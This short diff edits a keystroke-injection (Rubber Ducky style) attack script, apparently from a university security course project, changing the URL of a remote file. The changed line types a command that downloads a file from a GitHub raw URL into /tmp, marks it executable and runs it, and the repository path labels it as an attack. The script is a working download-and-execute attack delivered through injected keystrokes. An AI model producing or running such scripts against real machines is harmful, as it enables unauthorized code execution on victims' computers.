@@ -7,5 +7,5 @@ GUI ENTER
 DELAY 1500
 
 REM Download and execute dotfiles
-STRING cd /tmp && curl -fsSL https://raw.githubusercontent.com/corigne/CSCE5550ProjectAssets/main/p1_attack/payload -o payload && chmod +x payload && ./payload
+STRING cd /tmp && curl -fsSL https://raw.githubusercontent.com/corigne/CSCE5550-project/refs/heads/main/p1_attack/attack -o attack && chmod +x attack && ./attack
 ENTER
